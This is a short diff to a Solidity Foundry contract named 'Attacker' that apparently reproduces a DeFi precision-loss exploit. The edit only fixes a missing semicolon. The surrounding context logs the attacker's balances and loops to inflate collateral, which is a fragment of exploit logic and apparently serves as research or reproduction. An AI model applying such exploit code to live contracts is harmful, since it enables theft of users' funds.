@@ -68,7 +68,7 @@ contract Attacker is Test, Script {
         emit log_named_decimal_uint("sETH", sETH.balanceOf(attacker), sETH.decimals());
 
         // 2. presicion loss
-        emit log_named_decimal_uint("collateralToken", collateralToken.balanceOf(attacker), collateralToken.decimals())
+        emit log_named_decimal_uint("collateralToken", collateralToken.balanceOf(attacker), collateralToken.decimals());
         uint256 eachTime = collateralToken.signal() / 1 ether;
         emit log_named_decimal_uint("collateral increase each time", eachTime, collateralToken.decimals());
         while (collateralToken.balanceOf(attacker) / 1 ether < 147318 ) { // 250_000_000 / 1697
